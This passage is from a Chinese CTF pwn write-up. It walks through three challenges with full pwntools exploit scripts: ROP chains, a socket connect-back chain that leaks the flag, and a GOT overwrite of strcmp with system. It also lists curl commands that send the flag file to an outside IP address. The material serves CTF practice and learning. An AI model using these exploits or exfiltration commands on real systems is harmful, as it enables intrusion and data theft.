ret;</span></span><br><span class="line"><span class="string">0x0000000000066229: syscall; ret;</span></span><br><span class="line"><span class="string">0x0000000000032b5a: pop rsp; ret;</span></span><br><span class="line"><span class="string">0x0000000000043ae8: pop rax; ret;</span></span><br><span class="line"><span class="string">0x0000000000001b96: pop rdx; ret;</span></span><br><span class="line"><span class="string">0x00000000000d2745: syscall; ret;</span></span><br><span class="line"><span class="string">0x0000000000003960: pop rsp; ret; </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x0000000000401bb3</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x0000000000401bb1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sumbit</span>():</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;4. Quit.\n&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;4. Quit.\n&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Which?&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_v5_again</span>(<span class="params">v5,string</span>):</span></span><br><span class="line">    i=<span class="built_in">len</span>(string)</span><br><span class="line">    m=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(m&lt;=i-<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">if</span> m==<span class="number">16</span>:</span><br><span class="line">            m+=<span class="number">2</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        s=<span class="built_in">ord</span>(string[m])+(<span class="built_in">ord</span>(string[m+<span class="number">1</span>])&lt;&lt;<span class="number">8</span>)</span><br><span class="line">        v5=v5^s</span><br><span class="line">        m+=<span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> v5</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tcp_context</span>(<span class="params">v6,i,context</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;4. Quit.\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    tcp_message=p16(<span class="number">0x766e</span>) <span class="comment">#0</span></span><br><span class="line">    tcp_message+=p16(<span class="number">0x28b7</span>) <span class="comment">#2</span></span><br><span class="line">    tcp_message+=p32(v6) <span class="comment">#4</span></span><br><span class="line">    tcp_message+=p32(<span class="number">1</span>) <span class="comment">#8</span></span><br><span class="line">    tcp_message+=p16(i) <span class="comment">#12</span></span><br><span class="line">    tcp_message+=p16(<span class="number">1</span>) <span class="comment">#14</span></span><br><span class="line">    tcp_message+=p16(<span class="number">1</span>) <span class="comment">#16</span></span><br><span class="line">    tcp_message+=p16(<span class="number">0</span>) <span class="comment">#18</span></span><br><span class="line">    tcp_message+=p16(<span class="number">1</span>) <span class="comment">#20</span></span><br><span class="line">    tcp_message+=p16(<span class="number">0xffff</span>)<span class="comment">#22</span></span><br><span class="line">    tcp_message+=context</span><br><span class="line">    tcp_message=tcp_message.ljust(<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    v5=get_v5_again(<span class="number">0x140b</span>,tcp_message)</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(v5)</span><br><span class="line">    real_tcp_message=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tcp_message)):</span><br><span class="line">        <span class="keyword">if</span> i ==<span class="number">16</span>:</span><br><span class="line">            real_tcp_message+=<span class="built_in">str</span>(<span class="built_in">chr</span>(v5&amp;<span class="number">0xff</span>))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> i==<span class="number">17</span>:</span><br><span class="line">            real_tcp_message+=<span class="built_in">str</span>(<span class="built_in">chr</span>((v5&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        real_tcp_message+=tcp_message[i]</span><br><span class="line">    sleep(<span class="number">7</span>)</span><br><span class="line">    sh.send(real_tcp_message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(sh,&#x27;b *0x401A5D&#x27;)</span></span><br><span class="line">    v5=<span class="number">5131</span></span><br><span class="line">    tcp_context(<span class="number">1</span>,<span class="number">6</span>,<span class="string">&#x27;sss&#x27;</span>)</span><br><span class="line">    tcp_context(<span class="number">1</span>+<span class="number">4096</span>,<span class="number">6</span>,<span class="string">&#x27;sss&#x27;</span>)</span><br><span class="line">    tcp_context(<span class="number">1</span>+<span class="number">4096</span>+<span class="number">4096</span>,<span class="number">6</span>,<span class="string">&#x27;sss&#x27;</span>)</span><br><span class="line">    write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">    write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">    payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x68</span>+<span class="number">8</span>)+p64(pop_rsi_r15)+p64(write_got)*<span class="number">2</span>+p64(write_plt)+p64(main_addr)</span><br><span class="line">    tcp_context(<span class="number">1</span>+<span class="number">4096</span>+<span class="number">4096</span>+<span class="number">4096</span>,<span class="number">6</span>,payload)</span><br><span class="line">    sleep(<span class="number">8</span>)</span><br><span class="line">    sumbit()</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Done.\n&#x27;</span>)</span><br><span class="line">    libc_base=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line">    pop_rdx_r12=libc_base+<span class="number">0x000000000011c371</span></span><br><span class="line">    pop_rax=libc_base+<span class="number">0x000000000004a550</span></span><br><span class="line">    syscall_addr=libc_base+<span class="number">0x0000000000066229</span></span><br><span class="line">    pop_rsp=libc_base+<span class="number">0x0000000000032b5a</span></span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x68</span>+<span class="number">8</span>)+p64(pop_rax)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(bss_addr)*<span class="number">2</span></span><br><span class="line">    payload+=p64(pop_rdx_r12)+p64(<span class="number">0x300</span>)*<span class="number">2</span>+p64(syscall_addr)+p64(pop_rsp)+p64(bss_addr+<span class="number">0x10</span>)</span><br><span class="line">    tcp_context(<span class="number">1</span>+<span class="number">4096</span>+<span class="number">4096</span>+<span class="number">4096</span>,<span class="number">6</span>,payload)</span><br><span class="line">    sleep(<span class="number">8</span>)</span><br><span class="line">    sumbit()</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Done.\n&#x27;</span>)</span><br><span class="line">    payload=<span class="string">&#x27;./flag&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>)+p64(pop_rax)+p64(<span class="number">2</span>)+p64(pop_rdi)+p64(bss_addr)+p64(pop_rsi_r15)</span><br><span class="line">    payload+=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rdx_r12)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(syscall_addr)+p64(pop_rax)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(<span class="number">3</span>)</span><br><span class="line">    payload+=p64(pop_rsi_r15)+p64(bss_addr+<span class="number">0x200</span>)*<span class="number">2</span>+p64(pop_rdx_r12)+p64(<span class="number">0x30</span>)*<span class="number">2</span>+p64(syscall_addr)</span><br><span class="line">    payload+=p64(pop_rax)+p64(<span class="number">1</span>)+p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi_r15)+p64(bss_addr+<span class="number">0x200</span>)*<span class="number">2</span></span><br><span class="line">    payload+=p64(pop_rdx_r12)+p64(<span class="number">0x30</span>)*<span class="number">2</span>+p64(syscall_addr)</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span> sh.recv()</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="冰墩墩"><a href="#冰墩墩" class="headerlink" title="冰墩墩"></a>冰墩墩</h2><p>第一次遇见<code>close(0);close(1);close(2)</code>,以为没啥，就普通的orw,结果发现自己的read根本写不上去，查了下才发现关闭了标准输入输出，所以无法再和程序交互，无法交互我一下就想起了侧信道，但是试过发现本地可以远程还是不行，咨询了学长才明白，远程关闭了标准输入输出流即远程题目的socket也就断了，所以无法判断程序的状态了，后来研究了学长的wp和官网wp稍微搞懂了一点。</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>在远程使用<code>socket(AF_INET, SOCK_STREAM, IPPROTO_IP)</code>起一个socket客户端服务，然后使用connect连接我方服务器<code>connect(soc, (struct sockaddr *)&amp;serv_addr, sizeof(struct sockaddr_in))</code>，然后<code>write(socketfd,flag_addr.size)</code>,把flag传到我方服务器上面。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#sh = process([&#x27;./ld.so&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sh=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27264</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Dump of assembler code for function backDoor:</span></span><br><span class="line"><span class="string">   0x0000000000401349 &lt;+0&gt;:	endbr64 </span></span><br><span class="line"><span class="string">   0x000000000040134d &lt;+4&gt;:	push   rbp</span></span><br><span class="line"><span class="string">   0x000000000040134e &lt;+5&gt;:	mov    rbp,rsp</span></span><br><span class="line"><span class="string">   0x0000000000401351 &lt;+8&gt;:	syscall </span></span><br><span class="line"><span class="string">   0x0000000000401353 &lt;+10&gt;:	ret    </span></span><br><span class="line"><span class="string">   0x0000000000401354 &lt;+11&gt;:	pop    rdx</span></span><br><span class="line"><span class="string">   0x0000000000401355 &lt;+12&gt;:	ret    </span></span><br><span class="line"><span class="string">   0x0000000000401356 &lt;+13&gt;:	pop    rdi</span></span><br><span class="line"><span class="string">   0x0000000000401357 &lt;+14&gt;:	ret    </span></span><br><span class="line"><span class="string">   0x0000000000401358 &lt;+15&gt;:	pop    rsi</span></span><br><span class="line"><span class="string">   0x0000000000401359 &lt;+16&gt;:	ret    </span></span><br><span class="line"><span class="string">   0x000000000040135a &lt;+17&gt;:	pop    rax</span></span><br><span class="line"><span class="string">   0x000000000040135b &lt;+18&gt;:	ret    </span></span><br><span class="line"><span class="string">   0x000000000040135c &lt;+19&gt;:	push   rax</span></span><br><span class="line"><span class="string">   0x000000000040135d &lt;+20&gt;:	pop    rcx</span></span><br><span class="line"><span class="string">   0x000000000040135e &lt;+21&gt;:	ret    </span></span><br><span class="line"><span class="string">   0x000000000040135f &lt;+22&gt;:	mov    rdi,rcx</span></span><br><span class="line"><span class="string">   0x0000000000401362 &lt;+25&gt;:	ret    </span></span><br><span class="line"><span class="string">   0x0000000000401363 &lt;+26&gt;:	nop</span></span><br><span class="line"><span class="string">   0x0000000000401364 &lt;+27&gt;:	pop    rbp</span></span><br><span class="line"><span class="string">   0x0000000000401365 &lt;+28&gt;:	ret    </span></span><br><span class="line"><span class="string">End of assembler dump.</span></span><br><span class="line"><span class="string">0x0000000000401347: leave; ret;</span></span><br><span class="line"><span class="string">0x0000000000401014: call rax;</span></span><br><span class="line"><span class="string">0x000000000040116C                 jmp     rax</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">socket_addr=<span class="number">0x403700</span>+<span class="number">0x1a0</span></span><br><span class="line">flag_addr=<span class="number">0x403700</span>+<span class="number">0x1b0</span></span><br><span class="line">target=<span class="number">0x403700</span>+<span class="number">0x1c0</span></span><br><span class="line"><span class="comment">#gdb.attach(sh,&#x27;b main&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    pop_rax=<span class="number">0x000000000040135a</span></span><br><span class="line">    pop_rdi=<span class="number">0x0000000000401356</span></span><br><span class="line">    pop_rsi=<span class="number">0x0000000000401358</span></span><br><span class="line">    pop_rdx=<span class="number">0x0000000000401354</span></span><br><span class="line">    syscall_ret=<span class="number">0x0000000000401351</span></span><br><span class="line">    leave_ret=<span class="number">0x0000000000401347</span></span><br><span class="line">    <span class="comment">#open</span></span><br><span class="line">    payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(pop_rax)+p64(<span class="number">2</span>)+p64(pop_rdi)+p64(flag_addr)</span><br><span class="line">    payload+=p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rdx)+p64(<span class="number">0</span>)+p64(syscall_ret)</span><br><span class="line">    <span class="comment">#read</span></span><br><span class="line">    payload+=p64(pop_rax)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi)+p64(target)+p64(pop_rdx)</span><br><span class="line">    payload+=p64(<span class="number">0x30</span>)+p64(syscall_ret)</span><br><span class="line">    <span class="comment">#socket(2,1,0)</span></span><br><span class="line">    payload+=p64(pop_rax)+p64(<span class="number">41</span>)+p64(pop_rdi)+p64(<span class="number">2</span>)+p64(pop_rsi)+p64(<span class="number">1</span>)+p64(pop_rdx)</span><br><span class="line">    payload+=p64(<span class="number">0</span>)+p64(syscall_ret)</span><br><span class="line">    <span class="comment">#connect(socketfd,server_addr,0x10)</span></span><br><span class="line">    payload+=p64(pop_rax)+p64(<span class="number">42</span>)+p64(pop_rdi)</span><br><span class="line">    payload+=p64(<span class="number">1</span>)+p64(pop_rsi)+p64(socket_addr)</span><br><span class="line">    payload+=p64(pop_rdx)+p64(<span class="number">0x10</span>)+p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#write</span></span><br><span class="line">    payload+=p64(pop_rax)+p64(<span class="number">1</span>)+p64(pop_rdi)+p64(<span class="number">1</span>)</span><br><span class="line">    payload+=p64(pop_rsi)+p64(target)+p64(pop_rdx)+p64(<span class="number">0x30</span>)</span><br><span class="line">    payload+=p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">    payload=payload.ljust(<span class="number">0x1a0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    <span class="comment">#其中0100007f为127.0.0.1 e803 为03e8即1000，0002为AF_INET</span></span><br><span class="line">    payload+=p64(<span class="number">0x0100007f901f0002</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    payload+=<span class="string">&#x27;./flag&#x27;</span></span><br><span class="line">    payload=payload.ljust(<span class="number">0x200</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<p>注意server_addr的格式，其中ip地址和端口号都得反着写。</p>
<h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><p>第一看这么多的伪代码，看了一个下午才看明白，然后写脚本又花了很长时间，很麻烦，但也知道了很多东西。</p>
<h3 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h3><p>漏洞并不难以利用，但关键的是在茫茫码海中找见他，找见就很轻松了，漏洞主要来源于一下代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#得到<span class="function">elf_addr</span></span><br><span class="line"><span class="function"><span class="title">if</span> <span class="params">( type == <span class="number">102</span> )</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">          <span class="keyword">if</span> ( a5 &gt; <span class="number">0</span> )</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">          <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x800</span>uLL);</span><br><span class="line">          <span class="keyword">if</span> ( *(__int64 *)&amp;s[<span class="number">7</span> * i + <span class="number">2</span>] &lt;= <span class="number">4</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">sprintf</span>(</span><br><span class="line">              buf,</span><br><span class="line">              <span class="string">&quot;Let us look. Oh! That is %p -&gt; \&quot;%s\&quot;.\n&quot;</span>,</span><br><span class="line">              (&amp;off_6140)[*(_QWORD *)&amp;s[<span class="number">7</span> * i + <span class="number">2</span>]],</span><br><span class="line">              (&amp;off_6140)[*(_QWORD *)&amp;s[<span class="number">7</span> * i + <span class="number">2</span>]]);</span><br><span class="line">            v9 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">            send(acceptfd, buf, v9, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">          &#125;</span><br><span class="line">#任意地址写</span><br><span class="line"><span class="keyword">if</span> ( type == <span class="number">241</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( a5 &gt; <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_36;</span><br><span class="line">        *(_QWORD *)(*(_QWORD *)&amp;s[<span class="number">7</span> * i + <span class="number">2</span>] + *(_QWORD *)&amp;s[<span class="number">7</span> * i + <span class="number">4</span>]) = *(_QWORD *)&amp;s[<span class="number">7</span> * i + <span class="number">6</span>];</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x800</span>uLL);</span><br><span class="line">        <span class="built_in">sprintf</span>(buf, <span class="string">&quot;All right.I know what you say.\n&quot;</span>);</span><br><span class="line">        v11 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">        send(acceptfd, buf, v11, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这是报文的目录的参数格式，在传参的时候需要base64编码（别问我怎么知道的），但是不能直接传编码后的字符串，得把后面的等号去掉才行（对比别人的wp发现的）。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">s</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">    <span class="keyword">uint32_t</span> type;</span><br><span class="line">    <span class="keyword">uint64_t</span> addr1;</span><br><span class="line">    <span class="keyword">uint64_t</span> addr2;</span><br><span class="line">    <span class="keyword">uint64_t</span> write_for_addr;</span><br><span class="line">&#125;</span><br><span class="line">type==<span class="number">0xf1</span>&amp;&amp;a5&lt;=<span class="number">2</span>:</span><br><span class="line">    *(addr1+addr2)=write_for_addr;</span><br><span class="line">type==<span class="number">0x88</span>&amp;&amp;a5&lt;=<span class="number">1</span>:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p&quot;</span>,*(addr1+addr2))</span><br><span class="line">type==<span class="number">0x66</span>&amp;&amp;a5==<span class="number">0</span>&amp;&amp;addr1&lt;=<span class="number">4</span>:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p-&gt;%s&quot;</span>,(&amp;off_6140[addr1]),(&amp;off_6140[addr1]))</span><br><span class="line">type==<span class="number">0x12</span>&amp;&amp;addr1==<span class="string">&#x27;ping&#x27;</span>&amp;<span class="built_in">strlen</span>(&amp;addr2)&lt;=<span class="number">0xf</span></span><br><span class="line">        show</span><br></pre></td></tr></table></figure>

<p>然后利用上面代码的漏洞对got表发起攻击把strcmp改成system,但是注意不能system(“/bin/sh”),首先是shell的输入输出没有和socket绑定，其次当我们再次发送报文的时候会fork一个新进程来处理我们的报文，而不是发送给shell，所以需要反弹shell或者反弹flag,有很多反弹shell的命令但都没用，有两个反弹flag的命令能用。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system(&#x27;curl 47.107.28.194/`cat flag`&#x27;)</span><br><span class="line">system(&#x27;curl -X POST -F \&quot;flag=@/flag\&quot; 47.107.28.194:8080&#x27;)</span><br></pre></td></tr></table></figure>

<p>最后的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># ip=&#x27;127.0.0.1&#x27;</span></span><br><span class="line"><span class="comment"># port=4000</span></span><br><span class="line">ip=<span class="string">&#x27;node4.buuoj.cn&#x27;</span></span><br><span class="line">port=<span class="number">27718</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;./&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">sh=remote(ip,port)</span><br><span class="line">payload1=p32(<span class="number">1</span>)+p32(<span class="number">0x66</span>)+p64(<span class="number">4</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload1=base64.b64encode(payload1)</span><br><span class="line">payload1=payload1.replace(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">url1=<span class="string">&#x27;GET /submit.cgi?&#123;0&#125; HTTP/1.0\r\n\r\n&#x27;</span>.<span class="built_in">format</span>(payload1)</span><br><span class="line"><span class="built_in">print</span> url1</span><br><span class="line">sh.send(url1)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Let us look. Oh! That is &#x27;</span>)</span><br><span class="line">elf_base=<span class="built_in">int</span>(sh.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x4070</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(elf_base)</span><br><span class="line">sh.close()</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh=remote(ip,port)</span><br><span class="line">payload2=p32(<span class="number">1</span>)+p32(<span class="number">0x88</span>)+p64(elf_base)+p64(<span class="number">0x6070</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload2=base64.b64encode(payload2)     </span><br><span class="line">payload2=payload2.replace(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">url2=url1=<span class="string">&#x27;GET /submit.cgi?&#123;0&#125; HTTP/1.0\r\n\r\n&#x27;</span>.<span class="built_in">format</span>(payload2)</span><br><span class="line">sh.send(url2)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;OK! I give you some message!\nMessage: &#x27;</span>)</span><br><span class="line">printf_addr=<span class="built_in">int</span>(sh.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">libc_base=printf_addr-libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(printf_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line">strcmp_got=elf_base+elf.got[<span class="string">&#x27;strcmp&#x27;</span>]</span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh.close()</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh=remote(ip,port)</span><br><span class="line">payload3=p32(<span class="number">2</span>)+p32(<span class="number">241</span>)+p64(strcmp_got)</span><br><span class="line">payload3+=p64(<span class="number">0</span>)+p64(system_addr)</span><br><span class="line">payload3+=p32(<span class="number">0x22</span>)+<span class="string">&quot;curl 47.107.28.194/`cat flag`&quot;</span></span><br><span class="line">payload3=base64.b64encode(payload3)     </span><br><span class="line">payload3=payload3.replace(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">url3=<span class="string">&#x27;GET /submit.cgi?&#123;0&#125; HTTP/1.0\r\n\r\n&#x27;</span>.<span class="built_in">format</span>(payload3)</span><br><span class="line">sh.send(url3)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;All right.I know what you say&#x27;</span>)</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>对pwn理解的更深了，说白了就是对指定的ip和端口发起socket连接，然后把sh.send的内容发送给这个端口的应用。</p>
<p>最近做题感觉漏洞利用简单，代码审计困难的题目越来越多。</p>
